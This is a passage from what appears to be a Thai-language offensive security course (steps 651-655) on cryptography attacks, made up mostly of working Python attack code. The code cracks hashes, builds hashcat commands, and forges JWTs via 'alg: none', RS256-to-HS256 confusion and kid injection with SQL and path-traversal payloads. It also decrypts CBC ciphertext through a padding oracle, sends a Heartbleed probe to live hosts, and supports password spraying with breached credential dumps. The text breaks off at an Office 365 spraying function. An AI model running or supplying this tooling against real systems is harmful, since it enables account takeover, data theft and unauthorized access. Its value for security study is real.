# Part 66: Cryptography Attacks (Steps 651-660)

## ภาพรวม
การโจมตีระบบเข้ารหัสและเข้ารหัสที่ใช้งานไม่ถูกต้อง ตั้งแต่ Padding Oracle ไปจนถึงการ Crack JWT และ Hash Cracking

---

## Step 651: Hash Cracking Techniques

```python
#!/usr/bin/env python3
# Hash Cracking - ถอดรหัสด้วยวิธีต่างๆ

from dataclasses import dataclass, field
from typing import List, Dict, Optional, Iterator
import hashlib
import itertools
import string
from datetime import datetime

@dataclass
class HashInfo:
    hash_value: str
    hash_type: str
    cracked_value: Optional[str] = None
    crack_time: Optional[float] = None
    method_used: Optional[str] = None

class HashCracker:
    def __init__(self):
        self.hash_functions = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha256': hashlib.sha256,
            'sha512': hashlib.sha512
        }
    
    def identify_hash(self, hash_value: str) -> List[str]:
        """ระบุ Hash type จากความยาว"""
        length = len(hash_value.replace('$', '').replace(':', ''))
        
        type_map = {
            32: ['md5', 'md4', 'ntlm'],
            40: ['sha1', 'mysql5'],
            64: ['sha256'],
            128: ['sha512'],
            60: ['bcrypt'],
            34: ['md5crypt'],
        }
        
        # Special prefixes
        if hash_value.startswith('$2y$') or hash_value.startswith('$2b$'):
            return ['bcrypt']
        if hash_value.startswith('$6$'):
            return ['sha512crypt']
        if hash_value.startswith('$1$'):
            return ['md5crypt']
        if ':' in hash_value and len(hash_value.split(':')) == 2:
            return ['ntlmv2', 'md5:salt']
        
        return type_map.get(length, ['unknown'])
    
    def compute_hash(self, plaintext: str, hash_type: str, 
                     salt: str = "") -> str:
        """คำนวณ hash จาก plaintext"""
        text = (plaintext + salt).encode('utf-8')
        
        if hash_type in self.hash_functions:
            return self.hash_functions[hash_type](text).hexdigest()
        return ""
    
    def dictionary_attack(self, target_hash: str, hash_type: str,
                          wordlist: List[str]) -> Optional[str]:
        """โจมตีด้วย Dictionary Attack"""
        for word in wordlist:
            word = word.strip()
            computed = self.compute_hash(word, hash_type)
            if computed == target_hash:
                return word
            
            # Try with common mutations
            mutations = self._generate_mutations(word)
            for mutated in mutations:
                computed = self.compute_hash(mutated, hash_type)
                if computed == target_hash:
                    return mutated
        
        return None
    
    def _generate_mutations(self, word: str) -> List[str]:
        """Generate common password mutations"""
        mutations = [
            word.lower(),
            word.upper(),
            word.capitalize(),
            word + "1",
            word + "!",
            word + "123",
            word + "2024",
            "1" + word,
            word[0].upper() + word[1:] + "1",
            word.replace('a', '@').replace('o', '0').replace('i', '1').replace('e', '3')
        ]
        return mutations
    
    def brute_force_attack(self, target_hash: str, hash_type: str,
                           max_length: int = 6, 
                           charset: str = string.ascii_lowercase + string.digits
                           ) -> Optional[str]:
        """โจมตีด้วย Brute Force"""
        for length in range(1, max_length + 1):
            for candidate in itertools.product(charset, repeat=length):
                word = ''.join(candidate)
                if self.compute_hash(word, hash_type) == target_hash:
                    return word
        return None
    
    def rainbow_table_lookup(self, target_hash: str, 
                             table_file: str = None) -> Optional[str]:
        """ค้นหาใน Rainbow Table"""
        # Simulate rainbow table lookup with pre-computed hashes
        precomputed = {
            # MD5 hashes of common passwords
            "5f4dcc3b5aa765d61d8327deb882cf99": "password",
            "e10adc3949ba59abbe56e057f20f883e": "123456",
            "25f9e794323b453885f5181f1b624d0b": "123456789",
            "d8578edf8458ce06fbc5bb76a58c5ca4": "qwerty",
            "96e79218965eb72c92a549dd5a330112": "111111",
            "f25a2fc72690b780b2a14e140ef6a9e0": "iloveyou",
            "0d107d09f5bbe40cade3de5c71e9e9b7": "letmein",
            "202cb962ac59075b964b07152d234b70": "123",
        }
        
        return precomputed.get(target_hash.lower())
    
    def rule_based_attack(self, target_hash: str, hash_type: str,
                          base_word: str) -> Optional[str]:
        """โจมตีด้วย Rule-based mangling (Hashcat rules style)"""
        # Rules: l (lowercase), u (uppercase), r (reverse), d (duplicate)
        # Append numbers/specials
        candidates = set()
        
        w = base_word
        candidates.add(w)
        candidates.add(w.lower())          # l
        candidates.add(w.upper())          # u
        candidates.add(w[::-1])            # r
        candidates.add(w + w)              # d
        candidates.add(w.capitalize())     # c
        
        # Append rules
        for n in ['1', '2', '12', '123', '1234', '!', '@', '#', '2023', '2024']:
            candidates.add(w + n)
            candidates.add(w.capitalize() + n)
        
        # Prepend rules
        for p in ['1', 'the', 'The']:
            candidates.add(p + w)
        
        # Toggle case
        toggled = list(w)
        for i in range(len(toggled)):
            if toggled[i].isalpha():
                toggled[i] = toggled[i].swapcase()
        candidates.add(''.join(toggled))
        
        for candidate in candidates:
            if self.compute_hash(candidate, hash_type) == target_hash:
                return candidate
        
        return None


class HashcatAutomation:
    """Automate Hashcat commands"""
    
    HASH_MODES = {
        'md5': 0,
        'sha1': 100,
        'sha256': 1400,
        'sha512': 1700,
        'ntlm': 1000,
        'netlmv2': 5600,
        'bcrypt': 3200,
        'md5crypt': 500,
        'sha512crypt': 1800,
        'wpa2': 2500,
        'zip': 13600,
        'office2013': 9600
    }
    
    def build_dictionary_command(self, hash_file: str, wordlist: str,
                                  hash_type: str, rules_file: str = None) -> str:
        mode = self.HASH_MODES.get(hash_type, 0)
        cmd = f"hashcat -m {mode} -a 0 {hash_file} {wordlist}"
        
        if rules_file:
            cmd += f" -r {rules_file}"
        else:
            cmd += " -r /usr/share/hashcat/rules/best64.rule"
        
        cmd += " --force --status"
        return cmd
    
    def build_brute_force_command(self, hash_file: str, hash_type: str,
                                   max_length: int = 8, 
                                   charset: str = "?l?d") -> str:
        mode = self.HASH_MODES.get(hash_type, 0)
        mask = charset * max_length
        cmd = f"hashcat -m {mode} -a 3 {hash_file} {mask} --increment"
        return cmd
    
    def build_combinator_command(self, hash_file: str, wordlist1: str,
                                  wordlist2: str, hash_type: str) -> str:
        mode = self.HASH_MODES.get(hash_type, 0)
        return f"hashcat -m {mode} -a 1 {hash_file} {wordlist1} {wordlist2}"
    
    def get_common_rules(self) -> Dict[str, str]:
        return {
            "best64": "/usr/share/hashcat/rules/best64.rule",
            "rockyou-30000": "/usr/share/hashcat/rules/rockyou-30000.rule",
            "d3ad0ne": "/usr/share/hashcat/rules/d3ad0ne.rule",
            "dive": "/usr/share/hashcat/rules/dive.rule",
            "T0XlCv2": "/usr/share/hashcat/rules/T0XlCv2.rule"
        }


if __name__ == '__main__':
    cracker = HashCracker()
    hashcat = HashcatAutomation()
    
    # Test hash identification
    test_hashes = [
        "5f4dcc3b5aa765d61d8327deb882cf99",  # MD5
        "da39a3ee5e6b4b0d3255bfef95601890afd80709",  # SHA1
        "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"  # bcrypt
    ]
    
    print("Hash Identification:")
    for h in test_hashes:
        types = cracker.identify_hash(h)
        print(f"  {h[:32]}... -> {types}")
    
    # Dictionary attack simulation
    common_passwords = ["password", "123456", "admin", "letmein", "welcome"]
    target = cracker.compute_hash("password", "md5")
    
    print(f"\nDictionary Attack:")
    print(f"  Target hash: {target}")
    result = cracker.dictionary_attack(target, "md5", common_passwords)
    print(f"  Cracked: {result}")
    
    # Rainbow table
    known_hash = "5f4dcc3b5aa765d61d8327deb882cf99"
    result = cracker.rainbow_table_lookup(known_hash)
    print(f"\nRainbow Table Lookup: {result}")
    
    # Hashcat commands
    print("\nHashcat Commands:")
    print("  Dictionary:", hashcat.build_dictionary_command(
        "hashes.txt", "/usr/share/wordlists/rockyou.txt", "md5"
    ))
    print("  Brute Force:", hashcat.build_brute_force_command(
        "hashes.txt", "ntlm", max_length=8
    ))
```

---

## Step 652: JWT Token Attacks

```python
#!/usr/bin/env python3
# JWT Attack Techniques - None Algorithm, Key Confusion, Brute Force

from dataclasses import dataclass
from typing import Dict, Optional, List
import base64
import json
import hmac
import hashlib
import struct

@dataclass
class JWTToken:
    header: Dict
    payload: Dict
    signature: str
    raw_token: str

class JWTAttacker:
    def __init__(self):
        self.common_secrets = [
            "secret", "password", "123456", "admin",
            "jwt_secret", "your-256-bit-secret", "change_me",
            "supersecret", "myapp_secret", "development_key"
        ]
    
    def parse_jwt(self, token: str) -> JWTToken:
        """วิเคราะห์ JWT token"""
        parts = token.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid JWT format")
        
        def b64_decode(s):
            # Add padding if needed
            padding = 4 - len(s) % 4
            if padding != 4:
                s += '=' * padding
            return base64.urlsafe_b64decode(s)
        
        header = json.loads(b64_decode(parts[0]))
        payload = json.loads(b64_decode(parts[1]))
        
        return JWTToken(
            header=header,
            payload=payload,
            signature=parts[2],
            raw_token=token
        )
    
    def create_jwt(self, payload: Dict, secret: str, 
                   algorithm: str = "HS256") -> str:
        """Create a JWT token"""
        header = {"alg": algorithm, "typ": "JWT"}
        
        def b64_encode(data: Dict) -> str:
            json_str = json.dumps(data, separators=(',', ':'))
            encoded = base64.urlsafe_b64encode(json_str.encode())
            return encoded.rstrip(b'=').decode()
        
        header_b64 = b64_encode(header)
        payload_b64 = b64_encode(payload)
        message = f"{header_b64}.{payload_b64}"
        
        if algorithm == "HS256":
            sig = hmac.new(
                secret.encode(), 
                message.encode(), 
                hashlib.sha256
            ).digest()
        elif algorithm == "HS512":
            sig = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha512
            ).digest()
        elif algorithm == "none":
            return f"{message}."
        else:
            raise ValueError(f"Unsupported algorithm: {algorithm}")
        
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
        return f"{message}.{sig_b64}"
    
    def none_algorithm_attack(self, token: str) -> Dict:
        """
        'alg: none' attack
        Change algorithm to 'none', remove signature
        If server doesn't verify algorithm, accepts tampered token
        """
        jwt = self.parse_jwt(token)
        
        # Modify payload (e.g., elevate privileges)
        malicious_payload = dict(jwt.payload)
        malicious_payload['role'] = 'admin'
        malicious_payload['sub'] = 'administrator'
        if 'is_admin' in malicious_payload:
            malicious_payload['is_admin'] = True
        
        # Create token with 'none' algorithm
        forged_token = self.create_jwt(malicious_payload, "", "none")
        
        # Also try with 'None', 'NONE' case variations
        header_modified = {"alg": "none", "typ": "JWT"}
        
        return {
            "attack": "none_algorithm",
            "original_payload": jwt.payload,
            "modified_payload": malicious_payload,
            "forged_token": forged_token,
            "variations": [
                forged_token,
                forged_token.replace('"alg":"none"', '"alg":"None"'),
                forged_token.replace('"alg":"none"', '"alg":"NONE"'),
            ],
            "explanation": "Server must verify and reject 'alg: none' for this to fail"
        }
    
    def weak_secret_brute_force(self, token: str, 
                                 wordlist: List[str] = None) -> Dict:
        """ถอด Secret Key จาก JWT HS256"""
        jwt = self.parse_jwt(token)
        
        if jwt.header.get('alg', '') not in ['HS256', 'HS384', 'HS512']:
            return {"error": "Not HMAC algorithm"}
        
        alg = jwt.header['alg']
        hash_map = {
            'HS256': hashlib.sha256,
            'HS384': hashlib.sha384,
            'HS512': hashlib.sha512
        }
        
        words = wordlist or self.common_secrets
        parts = token.split('.')
        message = f"{parts[0]}.{parts[1]}"
        
        def add_padding(s):
            padding = 4 - len(s) % 4
            return s + '=' * (padding if padding != 4 else 0)
        
        expected_sig = base64.urlsafe_b64decode(add_padding(parts[2]))
        
        for secret in words:
            computed = hmac.new(
                secret.encode(),
                message.encode(),
                hash_map[alg]
            ).digest()
            
            if hmac.compare_digest(computed, expected_sig):
                return {
                    "found": True,
                    "secret": secret,
                    "algorithm": alg,
                    "message": f"JWT secret found: {secret}"
                }
        
        return {"found": False, "secrets_tried": len(words)}
    
    def rsa_hmac_confusion_attack(self, token: str, 
                                   public_key: bytes) -> Dict:
        """
        Algorithm Confusion Attack (RS256 -> HS256)
        If server accepts HS256 with RS256 public key as HMAC secret:
        Sign the token with HMAC-SHA256 using the public key as secret!
        """
        jwt = self.parse_jwt(token)
        
        # Change algorithm from RS256 to HS256
        new_header = dict(jwt.header)
        new_header['alg'] = 'HS256'
        
        def b64_encode(data):
            json_str = json.dumps(data, separators=(',', ':'))
            return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()
        
        modified_payload = dict(jwt.payload)
        modified_payload['role'] = 'admin'
        
        header_b64 = b64_encode(new_header)
        payload_b64 = b64_encode(modified_payload)
        message = f"{header_b64}.{payload_b64}"
        
        # Sign with public key as HMAC secret
        sig = hmac.new(
            public_key,
            message.encode(),
            hashlib.sha256
        ).digest()
        
        sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
        forged_token = f"{message}.{sig_b64}"
        
        return {
            "attack": "algorithm_confusion",
            "original_algorithm": jwt.header.get('alg'),
            "attack_algorithm": "HS256",
            "forged_token": forged_token,
            "explanation": (
                "If server uses same code path for RS256 and HS256 verification, "
                "it may verify HS256 signature using RSA public key as HMAC secret"
            )
        }
    
    def kid_injection_attack(self, token: str) -> Dict:
        """
        Key ID (kid) Injection Attack
        kid parameter used to look up key in database/filesystem
        Inject SQL or path traversal
        """
        jwt = self.parse_jwt(token)
        
        payloads = [
            # SQL Injection in kid
            "../../dev/null",  # Use /dev/null (empty) as key file
            "' UNION SELECT 'attacker_secret' --",  # SQLi - return attacker's key
            "../../../etc/passwd",  # Path traversal
            "0",  # Index 0 - often default/empty key
        ]
        
        def b64_encode(data):
            json_str = json.dumps(data, separators=(',', ':'))
            return base64.urlsafe_b64encode(json_str.encode()).rstrip(b'=').decode()
        
        malicious_payload = dict(jwt.payload)
        malicious_payload['role'] = 'admin'
        
        forged_tokens = []
        for kid_payload in payloads:
            header = {"alg": "HS256", "typ": "JWT", "kid": kid_payload}
            h = b64_encode(header)
            p = b64_encode(malicious_payload)
            message = f"{h}.{p}"
            
            # For /dev/null attack: sign with empty string
            secret = "" if kid_payload == "../../dev/null" else "attacker_secret"
            sig = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
            
            forged_tokens.append({
                "kid": kid_payload,
                "token": f"{message}.{sig_b64}"
            })
        
        return {"attack": "kid_injection", "tokens": forged_tokens}


class JWTAnalyzer:
    def analyze_security(self, token: str) -> Dict:
        """วิเคราะห์ความปลอดภัยของ JWT"""
        attacker = JWTAttacker()
        jwt = attacker.parse_jwt(token)
        
        issues = []
        recommendations = []
        
        # Check algorithm
        alg = jwt.header.get('alg', '')
        if alg == 'none':
            issues.append("CRITICAL: Algorithm is 'none' - no signature verification!")
        elif alg in ['HS256', 'HS384', 'HS512']:
            recommendations.append("Consider using RS256/RS512 instead of symmetric HMAC")
        
        # Check expiration
        if 'exp' not in jwt.payload:
            issues.append("HIGH: No expiration (exp) claim - token never expires")
        else:
            import time
            if jwt.payload['exp'] < time.time():
                issues.append("MEDIUM: Token is expired")
        
        # Check sensitive data in payload
        sensitive_fields = ['password', 'secret', 'key', 'token', 'credit_card']
        for field in sensitive_fields:
            if any(field.lower() in k.lower() for k in jwt.payload):
                issues.append(f"HIGH: Sensitive field '{field}' in JWT payload (not encrypted!)")
        
        # Check kid
        if 'kid' in jwt.header:
            recommendations.append("Ensure kid parameter is validated against allowed values")
        
        return {
            "algorithm": alg,
            "payload_claims": list(jwt.payload.keys()),
            "issues": issues,
            "recommendations": recommendations,
            "risk_level": "critical" if any("CRITICAL" in i for i in issues) else
                          "high" if issues else "medium"
        }


if __name__ == '__main__':
    attacker = JWTAttacker()
    
    # Create a sample JWT
    sample_payload = {"sub": "user123", "role": "user", "exp": 9999999999}
    token = attacker.create_jwt(sample_payload, "secret123")
    print(f"Sample JWT: {token[:50]}...")
    
    # Parse it
    jwt = attacker.parse_jwt(token)
    print(f"\nHeader: {jwt.header}")
    print(f"Payload: {jwt.payload}")
    
    # None algorithm attack
    none_attack = attacker.none_algorithm_attack(token)
    print(f"\nNone Algorithm Attack:")
    print(f"  Forged token: {none_attack['forged_token'][:50]}...")
    
    # Brute force
    result = attacker.weak_secret_brute_force(token)
    print(f"\nBrute Force Result: {result}")
    
    # Security analysis
    analyzer = JWTAnalyzer()
    analysis = analyzer.analyze_security(token)
    print(f"\nSecurity Analysis:")
    print(f"  Algorithm: {analysis['algorithm']}")
    print(f"  Issues: {analysis['issues']}")
```

---

## Step 653: Padding Oracle Attack

```python
#!/usr/bin/env python3
# Padding Oracle Attack - ถอดรหัส CBC ด้วย Padding Oracle

from dataclasses import dataclass
from typing import List, Optional, Callable
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

@dataclass
class PaddingOracleState:
    ciphertext: bytes
    iv: bytes
    block_size: int = 16

class PaddingOracleAttack:
    """
    AES-CBC Padding Oracle Attack
    
    CBC Decryption: P[i] = D(C[i]) XOR C[i-1]
    
    Padding Oracle:
    - Server tells us if padding is valid (via error message or timing)
    - We can decrypt without the key by manipulating C[i-1]
    
    Attack per byte:
    1. Flip byte in C[i-1] until padding is valid
    2. Valid PKCS#7: last byte = 0x01, last 2 bytes = 0x02 0x02, etc.
    3. From this, recover D(C[i]) = guessed_byte XOR 0x01
    4. Then P[i] = D(C[i]) XOR C[i-1]
    """
    
    def __init__(self, oracle_function: Callable[[bytes, bytes], bool]):
        self.oracle = oracle_function  # Returns True if padding valid
        self.block_size = 16
    
    def decrypt_block(self, target_block: bytes, 
                      prev_block: bytes) -> bytes:
        """Decrypt a single AES block"""
        decrypted = bytearray(self.block_size)
        intermediate = bytearray(self.block_size)  # D(C[i])
        
        # Work from last byte to first byte
        for byte_pos in range(self.block_size - 1, -1, -1):
            padding_val = self.block_size - byte_pos  # e.g., 1, 2, 3...
            
            # Build modified previous block
            modified_prev = bytearray(self.block_size)
            
            # Set already-known bytes to create correct padding
            for k in range(byte_pos + 1, self.block_size):
                modified_prev[k] = intermediate[k] ^ padding_val
            
            # Try all 256 values for current byte
            found = False
            for guess in range(256):
                modified_prev[byte_pos] = guess
                
                if self.oracle(bytes(modified_prev), target_block):
                    # Found valid padding!
                    # If not last byte, verify it's really padding_val
                    # (could be padding_val+1 extended by luck)
                    if byte_pos == self.block_size - 1:
                        # Verify by changing byte before
                        if byte_pos > 0:
                            verify = bytearray(modified_prev)
                            verify[byte_pos - 1] ^= 1
                            if not self.oracle(bytes(verify), target_block):
                                continue  # False positive
                    
                    intermediate[byte_pos] = guess ^ padding_val
                    decrypted[byte_pos] = intermediate[byte_pos] ^ prev_block[byte_pos]
                    found = True
                    break
            
            if not found:
                return None  # Failed to decrypt
        
        return bytes(decrypted)
    
    def decrypt(self, ciphertext: bytes, iv: bytes) -> Optional[bytes]:
        """ถอดรหัส CBC ciphertext โดยไม่รู้ Key"""
        blocks = [
            ciphertext[i:i+self.block_size]
            for i in range(0, len(ciphertext), self.block_size)
        ]
        
        plaintext = b""
        prev = iv
        
        for block in blocks:
            decrypted = self.decrypt_block(block, prev)
            if decrypted is None:
                return None
            plaintext += decrypted
            prev = block
        
        # Remove padding
        try:
            plaintext = unpad(plaintext, self.block_size)
        except ValueError:
            pass
        
        return plaintext


class VulnerableCBCServer:
    """Simulated vulnerable CBC server for demonstration"""
    
    def __init__(self, key: bytes = None):
        self.key = key or os.urandom(16)
    
    def encrypt(self, plaintext: str) -> tuple:
        iv = os.urandom(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext.encode(), 16))
        return iv, ciphertext
    
    def decrypt_with_oracle(self, iv: bytes, ciphertext: bytes) -> bool:
        """
        Oracle function - returns True if padding valid
        In real attack, this might be an HTTP 500 vs 200,
        or different error messages
        """
        try:
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(ciphertext)
            unpad(decrypted, 16)
            return True  # Valid padding
        except ValueError:
            return False  # Invalid padding (padding oracle!)


def demonstrate_padding_oracle():
    """Demonstrate the complete padding oracle attack"""
    print("=== Padding Oracle Attack Demo ===")
    
    # Setup vulnerable server
    try:
        server = VulnerableCBCServer()
        
        secret = "secret_message!"
        iv, ciphertext = server.encrypt(secret)
        print(f"Encrypted: {ciphertext.hex()}")
        print(f"IV: {iv.hex()}")
        
        # Create oracle function
        def oracle(test_iv, test_ciphertext):
            return server.decrypt_with_oracle(test_iv, test_ciphertext)
        
        # Perform attack
        attack = PaddingOracleAttack(oracle)
        
        print("\nAttacking... (decrypt without key)")
        recovered = attack.decrypt(ciphertext, iv)
        
        if recovered:
            print(f"Recovered plaintext: {recovered}")
        else:
            print("Attack failed")
    except ImportError:
        print("Install pycryptodome: pip install pycryptodome")
        print("\nPadding Oracle Attack explanation:")
        print("  1. Flip bytes in IV/previous block")
        print("  2. Send modified ciphertext to server")
        print("  3. Server leaks padding validity (200 vs 500 HTTP)")
        print("  4. Use oracle to recover intermediate state byte by byte")
        print("  5. XOR intermediate with original ciphertext to get plaintext")


if __name__ == '__main__':
    demonstrate_padding_oracle()
```

---

## Step 654: SSL/TLS Attack Techniques

```python
#!/usr/bin/env python3
# SSL/TLS Security Analysis - ตรวจสอบและโจมตี SSL/TLS

from dataclasses import dataclass, field
from typing import List, Dict, Optional
import ssl
import socket
import subprocess
import json
from datetime import datetime

@dataclass
class TLSInfo:
    host: str
    port: int
    protocol: str
    cipher_suite: str
    certificate_info: Dict
    vulnerabilities: List[str] = field(default_factory=list)

class TLSScanner:
    def __init__(self):
        self.WEAK_CIPHERS = [
            'RC4', 'DES', '3DES', 'RC2', 'NULL', 'EXPORT', 
            'ANON', 'MD5', 'ADH', 'LOW'
        ]
        self.WEAK_PROTOCOLS = ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']
    
    def scan_tls(self, host: str, port: int = 443) -> TLSInfo:
        """Scan TLS configuration"""
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        try:
            with socket.create_connection((host, port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    cipher = ssock.cipher()
                    protocol = ssock.version()
                    
                    cert_info = self._parse_certificate(cert)
                    vulnerabilities = self._check_vulnerabilities(
                        protocol, cipher[0], cert_info
                    )
                    
                    return TLSInfo(
                        host=host,
                        port=port,
                        protocol=protocol,
                        cipher_suite=cipher[0],
                        certificate_info=cert_info,
                        vulnerabilities=vulnerabilities
                    )
        except Exception as e:
            return TLSInfo(
                host=host, port=port, protocol="ERROR",
                cipher_suite="", certificate_info={},
                vulnerabilities=[f"Connection error: {str(e)}"]
            )
    
    def _parse_certificate(self, cert: Dict) -> Dict:
        """Parse certificate information"""
        if not cert:
            return {}
        
        subject = dict(x[0] for x in cert.get('subject', []))
        issuer = dict(x[0] for x in cert.get('issuer', []))
        
        # Parse dates
        not_after = cert.get('notAfter', '')
        try:
            expiry = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
            days_to_expiry = (expiry - datetime.now()).days
        except ValueError:
            days_to_expiry = None
        
        sans = []
        for san_list in cert.get('subjectAltName', []):
            if san_list[0] == 'DNS':
                sans.append(san_list[1])
        
        return {
            "subject": subject.get('commonName', ''),
            "issuer": issuer.get('organizationName', ''),
            "valid_from": cert.get('notBefore', ''),
            "valid_until": not_after,
            "days_to_expiry": days_to_expiry,
            "san_domains": sans,
            "serial": cert.get('serialNumber', '')
        }
    
    def _check_vulnerabilities(self, protocol: str, cipher: str,
                                cert_info: Dict) -> List[str]:
        """Check for known TLS vulnerabilities"""
        vulns = []
        
        # Protocol vulnerabilities
        if protocol in self.WEAK_PROTOCOLS:
            vuln = f"Weak protocol: {protocol}"
            if protocol in ['SSLv2', 'SSLv3']:
                vuln += " (POODLE vulnerable)"
            vulns.append(vuln)
        
        # Cipher vulnerabilities
        cipher_upper = cipher.upper()
        for weak in self.WEAK_CIPHERS:
            if weak in cipher_upper:
                vuln_map = {
                    'RC4': 'RC4 cipher (BEAST/BREACH vulnerable)',
                    '3DES': '3DES cipher (SWEET32 vulnerable)',
                    'NULL': 'NULL cipher (no encryption!)',
                    'EXPORT': 'Export cipher (FREAK/LOGJAM vulnerable)'
                }
                vulns.append(f"Weak cipher: {weak} - {vuln_map.get(weak, '')}")
                break
        
        # Certificate vulnerabilities
        if cert_info.get('days_to_expiry') is not None:
            if cert_info['days_to_expiry'] < 0:
                vulns.append("Certificate EXPIRED")
            elif cert_info['days_to_expiry'] < 30:
                vulns.append(f"Certificate expires in {cert_info['days_to_expiry']} days")
        
        return vulns
    
    def check_heartbleed(self, host: str, port: int = 443) -> Dict:
        """ตรวจสอบ Heartbleed (CVE-2014-0160)"""
        # Heartbleed: OpenSSL 1.0.1-1.0.1f
        # Sends malformed heartbeat request to leak server memory
        
        # Heartbeat request with length > actual payload
        heartbeat_request = (
            b"\x18"       # Content type: Heartbeat
            b"\x03\x02"   # TLS 1.1
            b"\x00\x03"   # Length: 3
            b"\x01"       # Heartbeat type: Request
            b"\xff\xff"   # Payload length: 65535 (malicious!)
            # No actual 65535 bytes of payload - this is the vulnerability
        )
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            
            # TLS ClientHello with heartbeat extension
            client_hello = self._build_client_hello_with_heartbeat()
            sock.send(client_hello)
            
            # Wait for ServerHello
            data = sock.recv(4096)
            
            # Send malformed heartbeat
            sock.send(heartbeat_request)
            response = sock.recv(4096)
            
            sock.close()
            
            if len(response) > 5 and response[0] == 0x18:
                return {
                    "vulnerable": True,
                    "bytes_leaked": len(response),
                    "cve": "CVE-2014-0160",
                    "message": "Server responded to oversized heartbeat - POTENTIALLY VULNERABLE"
                }
            
            return {"vulnerable": False, "message": "Server did not respond with extra data"}
            
        except Exception as e:
            return {"error": str(e), "vulnerable": False}
    
    def _build_client_hello_with_heartbeat(self) -> bytes:
        """สร้าง TLS ClientHello ที่มี Heartbeat Extension"""
        # Simplified ClientHello for heartbleed detection
        # In production, use existing PoC tools
        return (
            b"\x16\x03\x01"  # Handshake, TLS 1.0
            b"\x00\x31"       # Length
            b"\x01"           # HandshakeType: ClientHello
            b"\x00\x00\x2d"  # Length
            b"\x03\x02"       # Version: TLS 1.1
            b"\x50\x34\xf6\x58"  # Random (gmt_unix_time)
            b"\x00" * 28      # Random bytes
            b"\x00"           # Session ID length
            b"\x00\x02"       # CipherSuites length
            b"\x00\x2f"       # TLS_RSA_WITH_AES_128_CBC_SHA
            b"\x01\x00"       # Compression: null
            b"\x00\x00"       # Extensions length (empty)
        )
    
    def run_testssl(self, host: str, port: int = 443) -> Dict:
        """รัน testssl.sh เพื่อตรวจสอบ TLS configuration"""
        try:
            result = subprocess.run(
                ["testssl", "--json-pretty", f"{host}:{port}"],
                capture_output=True, text=True, timeout=120
            )
            
            if result.returncode == 0:
                return json.loads(result.stdout)
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        
        return {
            "command": f"testssl --json-pretty {host}:{port}",
            "note": "Install testssl.sh from https://testssl.sh/"
        }


if __name__ == '__main__':
    scanner = TLSScanner()
    
    print("TLS Scanner ready")
    print("Usage:")
    print("  info = scanner.scan_tls('example.com', 443)")
    print("  heart = scanner.check_heartbleed('vulnerable-host.com')")
    print("  testssl_result = scanner.run_testssl('target.com')")
    
    print("\nKnown TLS Vulnerabilities:")
    vulns = {
        "BEAST (CVE-2011-3389)": "CBC cipher in TLS 1.0 - IV predictable",
        "CRIME (CVE-2012-4929)": "TLS compression leaks session cookie",
        "BREACH (CVE-2013-3587)": "HTTP compression leaks secret data",
        "POODLE (CVE-2014-3566)": "SSLv3 padding oracle attack",
        "Heartbleed (CVE-2014-0160)": "OpenSSL heartbeat buffer over-read",
        "FREAK (CVE-2015-0204)": "Export grade cipher downgrade",
        "LOGJAM (CVE-2015-4000)": "DHE downgrade to weak DH parameters",
        "DROWN (CVE-2016-0800)": "SSLv2 cross-protocol attack",
        "SWEET32 (CVE-2016-2183)": "Birthday attack on 64-bit ciphers (3DES)"
    }
    for name, desc in vulns.items():
        print(f"  {name}: {desc}")
```

---

## Step 655: Password Spraying & Credential Stuffing

```python
#!/usr/bin/env python3
# Password Spraying & Credential Stuffing - เทคนิคการโจมตี Credentials

from dataclasses import dataclass, field
from typing import List, Dict, Optional
import time
import json
from datetime import datetime

@dataclass
class SprayResult:
    username: str
    password: str
    status: str  # success, failed, locked, mfa_required
    response_time: float
    timestamp: str

class PasswordSprayingFramework:
    def __init__(self):
        self.results: List[SprayResult] = []
        self.lockout_threshold = 3
        self.spray_delay = 30 * 60  # 30 minutes between rounds
    
    def load_credential_dump(self, dump_file: str) -> List[Dict]:
        """โหลด Credential Dump (จาก HaveIBeenPwned, data breach)"""
        credentials = []
        try:
            with open(dump_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            credentials.append({
                                'email': parts[0],
                                'password': parts[1]
                            })
        except FileNotFoundError:
            # Return sample for demo
            credentials = [
                {'email': 'user1@company.com', 'password': 'Summer2024!'},
                {'email': 'admin@company.com', 'password': 'Admin123!'}
            ]
        
        return credentials
    
    def generate_spray_passwords(self, company_name: str = "",
                                  current_year: int = 2024) -> List[str]:
        """สร้างรายการ Password สำหรับ Password Spray"""
        passwords = [
            # Season + Year patterns
            f"Spring{current_year}!", f"Summer{current_year}!",
            f"Fall{current_year}!", f"Winter{current_year}!",
            f"Spring{current_year}", f"Summer{current_year}",
            f"Jan{current_year}!", f"Jan{current_year}",
            
            # Common corporate passwords
            f"Welcome{current_year}!", f"Password{current_year}!",
            "Welcome1!", "Password1", "Password1!",
            "Monday1!", "Qwerty123!",
            
            # Month + Year
            f"January{current_year}", f"February{current_year}",
            
            # Company-specific
        ]
        
        if company_name:
            passwords.extend([
                f"{company_name}1",
                f"{company_name}123",
                f"{company_name}@{current_year}",
                f"{company_name.capitalize()}1!",
            ])
        
        return passwords
    
    def perform_o365_spray(self, usernames: List[str], 
                            password: str) -> List[SprayResult]:
        """สิมูเลท Office 365 Password Spray (educational)"""
